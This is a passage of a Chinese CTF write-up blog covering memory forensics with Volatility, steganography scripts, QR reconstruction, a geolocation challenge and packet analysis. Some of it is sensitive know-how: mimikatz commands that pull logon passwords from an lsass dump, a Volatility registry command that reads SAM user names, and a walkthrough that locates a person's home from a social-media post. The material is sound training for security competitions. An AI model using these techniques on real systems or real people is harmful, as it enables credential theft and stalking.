--profile=WinXPSP2x86</span><br><span class="line"></span><br><span class="line"># 命令行扫描 ——cmdscan</span><br><span class="line">volatility -f filename cmdscan --profile=WinXPSP2x86</span><br><span class="line"></span><br><span class="line"># 文件扫描 ——filescan</span><br><span class="line">volatility -f filename filescan --profile=WinXPSP2x86</span><br><span class="line"></span><br><span class="line"># 查看notepad中的内容</span><br><span class="line">volatility -f filename notepad --profile=WinXPSP2x86</span><br><span class="line"></span><br><span class="line"># 提取文件</span><br><span class="line">volatility -f 1.raw  --profile=Win7SP1x86 dumpfiles -Q 0x000000003e71e608 --dump-dir=./</span><br><span class="line">-Q的参数为 内存地址</span><br><span class="line">--dump-dir的参数为导出文件的目录</span><br><span class="line"></span><br><span class="line"># ie浏览器记录</span><br><span class="line">iehistory</span><br><span class="line"></span><br><span class="line"># 截屏</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 内存网络扫描</span><br><span class="line">volatility -f filename --profile=Win7SP1x64 netscan</span><br><span class="line"></span><br><span class="line"># 读取cmd命令</span><br><span class="line">volatility -f filename --profile=Win7SP1x64 amdscan</span><br><span class="line"></span><br><span class="line"># 列举内存注册表</span><br><span class="line">volatility -f filename --profile=Win7SP1x64 hivelist</span><br><span class="line"></span><br><span class="line"># 解析指定的注册表</span><br><span class="line">volatility -f filename --profile=Win7SP1x64 -o 0xfffff8a0013fb010 printkey</span><br><span class="line"></span><br><span class="line"># 获取主机名</span><br><span class="line">volatility -f filename --profile=Win7SP1x64 -o 0xfffff8a0013fb010 printkey -K “ControlSet001\Control\ComputerName\ComputerName”</span><br><span class="line"></span><br><span class="line"># 获取windows主机用户名</span><br><span class="line">volatility -f filename --profile=Win7SP1x64 -o 0xfffff8a0013fb010 printkey -K “SAM\Domains\Account\Users\Names”</span><br><span class="line"></span><br><span class="line"># 抓取用户密码</span><br><span class="line">volatility -f filename mimikatz</span><br><span class="line"></span><br><span class="line"># 文件扫描</span><br><span class="line">volatility -f filename filescan</span><br><span class="line"></span><br><span class="line"># 配合grep文件扫描</span><br><span class="line">volatility -f filename filescan | grep “flag”</span><br></pre></td></tr></table></figure><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="地图分析——BugKu社工-进阶收集"><a href="#地图分析——BugKu社工-进阶收集" class="headerlink" title="地图分析——BugKu社工-进阶收集"></a>地图分析——BugKu社工-进阶收集</h3><p>提　　示: flag{小美小区名字拼音}</p><p>描　　述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编题，难度降低了。)</p><p>给出的附件内容如下所示</p><p><img src="/2021/05/28/CTF//qq.png" alt="附件"></p><p>首先看到那个塔是大雁塔，根据发帖的内容确定</p><ol><li>从发帖人家(附近的<strong>始发站</strong>)出发到大雁塔要做7站地铁。</li><li>该始发站距发帖人家的小区有800米</li><li>下一站距发帖人家1000多米。</li></ol><p>找到大雁塔附近的地铁路线图如下：</p><p><img src="/2021/05/28/CTF//20210219162217227.png" alt="西安地铁路线图"></p><p><img src="/2021/05/28/CTF//image-20210528200737880.png" alt="确定始发站为韦曲南站"></p><p>根据地铁线路图可以发现只有韦曲南站距离大雁塔的站点数为7并且中间又转乘(在小寨)了一站，故现在的条件为，发帖人家的小区距离韦曲南站有800米、距航天城1000多米。打开百度地图</p><p><img src="/2021/05/28/CTF//image-20210528201622601.png" alt="image-20210528201622601"></p><p>到目前为止，差不多一眼就能看出来了，很明显发帖人所在的小区就是兰乔国际城</p><p><img src="/2021/05/28/CTF//image-20210528201736743.png" alt="对距离的大概估算"></p><p><code>flag&#123;lanqiaoguojicheng&#125;</code></p><h2 id="二维码与拼图"><a href="#二维码与拼图" class="headerlink" title="二维码与拼图"></a>二维码与拼图</h2><h3 id="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"><a href="#根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事" class="headerlink" title="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"></a>根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事</h3><p>附件内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0000000001110010000000000</span><br><span class="line">0000000000011110100000000</span><br><span class="line">0000000001110001000000000</span><br><span class="line">0000000010111100000000000</span><br><span class="line">0000000010101010000000000</span><br><span class="line">0000000001100010100000000</span><br><span class="line">0000000010101010100000000</span><br><span class="line">0000000001000001100000000</span><br><span class="line">1100011101110110100011000</span><br><span class="line">0001000010110010010010100</span><br><span class="line">0100111101000011101110011</span><br><span class="line">0011110100101011001001001</span><br><span class="line">1000001001100001001101000</span><br><span class="line">1111000111111011100101000</span><br><span class="line">1011011111001101111110111</span><br><span class="line">1000110110010010101101100</span><br><span class="line">1000111100111111111110111</span><br><span class="line">0000000010110001100010100</span><br><span class="line">0000000010010100101010001</span><br><span class="line">0000000010101010100011001</span><br><span class="line">0000000000100111111110010</span><br><span class="line">0000000000011001011110111</span><br><span class="line">0000000001001100100100001</span><br><span class="line">0000000011000011011011001</span><br><span class="line">0000000011010000101110101</span><br></pre></td></tr></table></figure><p>猜测可能是个二维码的形状，打开python写一手转换代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1和0的故事.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.readlines()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res.append(<span class="built_in">str</span>(content[i]).replace(<span class="string">&#x27;\\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">        <span class="keyword">if</span> res[i][j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            plt.scatter(i, j, <span class="number">250</span>, c=<span class="string">&#x27;black&#x27;</span>, marker=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># 这个我后来又改了一下，这个我感觉是复原二维码来说最好用的</span></span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210529000305513.png" alt="得到下面的图像"></p><p>然后用ps添加一下二维码的三个角获得完整的二维码。</p><p>定位角如下</p><p><img src="/2021/05/28/CTF//image-20210528235634252.png" alt="定位角"></p><p>把定位角粘到二维码的三个角的地方就行了，或者使用windows 的画图程序也挺好使的其实，但是如果是拼图的话，画图可能就不是那么好使了。</p><p><img src="/2021/05/28/CTF//image-202105290003055132.png" alt="image-202105290003055132"></p><p>用手机qq勉强也是能扫出来flag的，就是我画的不太好看，用在线的网站都不行。。。<code>flag&#123;QR_c0de_1s_1nterest1n9&#125;</code></p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><h3 id="BugKu、easy-nbt"><a href="#BugKu、easy-nbt" class="headerlink" title="BugKu、easy_nbt"></a>BugKu、easy_nbt</h3><p>这个直接下载个文件的专用打开器，然后把New World文件夹拉入文件打开器search-&gt;value&#x3D;flag。就找到flag了。</p><p><img src="/2021/05/28/CTF//image-20210530135639553.png" alt="image-20210530135639553"></p><p><code>flag&#123;Do_u_kN0w_nbt?&#125;</code></p><h3 id="buu、-WUSTCTF2020-爬"><a href="#buu、-WUSTCTF2020-爬" class="headerlink" title="buu、[WUSTCTF2020]爬"></a>buu、[WUSTCTF2020]爬</h3><p><strong>TAG:pdf隐写</strong></p><p>使用一般的txt浏览器看一眼是pdf的文件格式，直接把后缀名改为pdf，要修改pdf，这里找了很多pdf的编辑器都是没法使用，要会员什么的，这里用的是福昕pdf编辑器，虽然需要会员才可以保存，但是不需要会员就能编辑。这里我们只需要编辑的功能就可以了。</p><p><img src="/2021/05/28/CTF//image-20210803190718182.png"></p><p><img src="/2021/05/28/CTF//image-20210803190759861.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br><span class="line"></span><br><span class="line">wctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;</span><br></pre></td></tr></table></figure><h2 id="文件内容隐藏"><a href="#文件内容隐藏" class="headerlink" title="文件内容隐藏"></a>文件内容隐藏</h2><p>这个一般是图片内部加入一些东西，ctf常见题型之一，其类型可能应归属于图片隐写。</p><h3 id="尾部藏文本"><a href="#尾部藏文本" class="headerlink" title="尾部藏文本"></a>尾部藏文本</h3><h4 id="unicode编码-BugKu、这是一张单纯的图片"><a href="#unicode编码-BugKu、这是一张单纯的图片" class="headerlink" title="unicode编码-BugKu、这是一张单纯的图片"></a>unicode编码-BugKu、这是一张单纯的图片</h4><p>是最简单的隐写题类型，直接在文件的尾部发现下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;</span><br></pre></td></tr></table></figure><p>这个内容一看就是unicode啊，再看都小于0xff，那就可以转ASCII码了，直接上拿手python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;&#x27;</span></span><br><span class="line">res1 = s[<span class="number">2</span>:<span class="built_in">len</span>(s)-<span class="number">1</span>].split(<span class="string">&#x27;;&amp;#&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># key&#123;you are right&#125;</span></span><br></pre></td></tr></table></figure><p>Unicode特征<code>&amp;#&#123;&#125;;</code>，大括号内的内容是数字。</p><h3 id="尾部藏文件"><a href="#尾部藏文件" class="headerlink" title="尾部藏文件"></a>尾部藏文件</h3><h4 id="outguess隐写、alison-likes-jojo"><a href="#outguess隐写、alison-likes-jojo" class="headerlink" title="outguess隐写、alison_likes_jojo"></a>outguess隐写、alison_likes_jojo</h4><p>没啥好说的，压缩包解压之后是两张图片，图片尾部发现zip文件的文件头<code>pk</code>，直接在winhex里面复制粘贴为zip文件后是个真加密的zip，爆破得口令为<code>888866</code>，解压这个压缩包得到内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</span><br></pre></td></tr></table></figure><p>三次解base64之后得到后面的jpg文件的outguess隐写的key为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killerqueen</span><br></pre></td></tr></table></figure><p>需要再对后面的jpg进行outguess，命令为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &#x27;killerqueen&#x27; -r &#x27;jljy.jpg&#x27; flag.txt</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210601141030631.png" alt="image-20210601141030631"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;</span><br></pre></td></tr></table></figure><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><h3 id="修改PNG图片的宽高隐写"><a href="#修改PNG图片的宽高隐写" class="headerlink" title="修改PNG图片的宽高隐写"></a>修改PNG图片的宽高隐写</h3><h4 id="BugKu、隐写"><a href="#BugKu、隐写" class="headerlink" title="BugKu、隐写"></a>BugKu、隐写</h4><p>开局给了一张png图片，拖入winhex改宽高即可。</p><p>先查看文件的详细信息，找到图片的分辨率为<code>500 x 420</code>转成十六进制也就是<code>01F4 x 01A4</code>，在winhex中找到高度宽度位，修改高度位<code>01A4</code>为<code>02A4</code></p><p><img src="/2021/05/28/CTF//image-20210530143746251.png" alt="image-20210530143746251"></p><p><code>BUGKU&#123;a1e5aSA&#125;</code></p><h3 id="PNGの求得图片正确宽高"><a href="#PNGの求得图片正确宽高" class="headerlink" title="PNGの求得图片正确宽高"></a>PNGの求得图片正确宽高</h3><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;xxx.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x38162a34</span>):    <span class="comment">#图片当前CRC</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure><h3 id="PNGのLSB最低位"><a href="#PNGのLSB最低位" class="headerlink" title="PNGのLSB最低位"></a>PNGのLSB最低位</h3><p>一般使用zsteg &amp;&amp; stegsolve &amp;&amp; python脚本解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># zsteg使用方法</span><br><span class="line">zsteg test.png</span><br><span class="line"># 将内容分离到文件</span><br><span class="line">zsteg test.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><h4 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h4><p><strong>TAG:zsteg使用、html、base64</strong></p><p>题目给的附件是两个文件，一个图片，一个有个html的src源代码文件，vscode打开html，发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">suctf&#123;hAHaha_Fak3_F1ag&#125;</span><br></pre></td></tr></table></figure><p>然后就是那个图片了，png考虑lsb，使用zsteg工具，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(m4xlmum㉿DESKTOP-MQAVU95)-[/mnt/c/Users/Administrator/Desktop/month/6月ctf题目/buuoj/misc/[SUCTF 2019]Game]</span><br><span class="line">└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png</span><br><span class="line">imagedata           .. text: &quot;*,+555\n\n\n&quot;</span><br><span class="line">b1,r,lsb,xy         .. text: &quot;4QPz1&#123;wS?[P&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. file: openssl enc&#x27;d data with salted password, base64 encoded</span><br><span class="line">b2,r,lsb,xy         .. file: 0420 Alliant virtual executable common library not stripped</span><br><span class="line">b3,r,lsb,xy         .. file: StarOffice Gallery theme \375\245N\333PNO\376\3017\026\003\360D\0055%\226Y$\237\3738\020\331\247\226\377-\226\331\177\004\020\233, 50397955 objects, 1st \001</span><br><span class="line">b3,b,lsb,xy         .. text: &quot;Yx(7TRIc&quot;</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;gwfE#UU #Dwvh&quot;</span><br><span class="line">b4,r,msb,xy         .. text: [&quot;\&quot;&quot; repeated 8 times]</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;vwvETgfRDw&quot;</span><br><span class="line">b4,g,msb,xy         .. text: &quot;!!ffffffff&quot;</span><br><span class="line">b4,b,lsb,xy         .. text: &quot;#EDEUEUEEx&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;!!ffffffff&quot;</span><br><span class="line">b4,rgb,lsb,xy       .. text: &quot;i%p$$sFG&quot;</span><br><span class="line">b4,bgr,lsb,xy       .. text: &quot;Yeu$ t&amp;C&quot;</span><br><span class="line">┌──(m4xlmum㉿DESKTOP-MQAVU95)-[/mnt/c/Users/Administrator/Desktop/month/6月ctf题目/buuoj/misc/[SUCTF 2019]Game]</span><br><span class="line">└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>出来的<code>1.txt</code>文件的头部发现分组加密的内容</p><p><img src="/2021/05/28/CTF//image-20210606153006340.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</span><br></pre></td></tr></table></figure><p>以前面解得的fake flag作为密钥，解3DES可得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;U_F0und_1t&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210606153135261.png"></p><h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><h4 id="python2脚本"><a href="#python2脚本" class="headerlink" title="python2脚本"></a>python2脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2.7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_stego</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span>(diff)</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span>(goflag(bin_str))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">goflag</span>(<span class="params">bin_str</span>):</span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="Telnet流量分析"><a href="#Telnet流量分析" class="headerlink" title="Telnet流量分析"></a>Telnet流量分析</h3><h4 id="Bugku、telnet"><a href="#Bugku、telnet" class="headerlink" title="Bugku、telnet"></a>Bugku、telnet</h4><p>给的流量包拖入wireshark打开跟踪流直接跟踪一段TCP流发现flag</p><p><img src="/2021/05/28/CTF//image-20210530145908225.png" alt="image-20210530145908225"></p><p><code>flag&#123;d316759c281bf925d600be698a4973d5&#125;</code></p><h3 id="http流量分析"><a href="#http流量分析" class="headerlink" title="http流量分析"></a>http流量分析</h3><h4 id="buu、百里挑一"><a href="#buu、百里挑一" class="headerlink" title="buu、百里挑一"></a>buu、百里挑一</h4><p>首先打开wireshark查看一下有什么数据都</p><p><img src="/2021/05/28/CTF//image-20210601230943606.png" alt="image-20210601230943606"></p><p>一看流量包瞬间明白出题人什么意思了，这是让从100多张图片里面选出来包含信息的那个啊，直接导出http对象。。。没啥用</p><p>用<code>exiftool *</code>，发现半拉flag。</p><p><img src="/2021/05/28/CTF//image-20210601232818680.png" alt="image-20210601232818680"></p><p><code>恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</code>，另一半在wireshark里面<code>TCP流 114</code>，这里可以一个一个看，应该没啥简单的方法了。</p><p><img src="/2021/05/28/CTF//image-20210601233334032.png" alt="image-20210601233334032"></p><p><code>26a3c0589d23edeec&#125;</code></p><p><code>flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</code></p><h4 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h4><p>wireshark打开文件，稍微一追踪tcp流就知道这是某嗨客拿工具在扫目录，直接向后跳，到大约<code>819条数据</code>开始出现有用的数据，第824条数据出现关键字<code>flag.txt</code>，还有pk，应该是flag在压缩包里面，压缩包被嗨客下载下来了，导出所有http对象。但是里面并没有发现zip文件，只好使用foremost再分离一下。</p><p><img src="/2021/05/28/CTF//image-20210606114640134.png"></p><p>想起刚才导出http对象时有一个lsass文件，最近学域渗透恰巧知道了这个是windows里面存放开机口令的文件，可使用mimikatz来解析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><p>得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 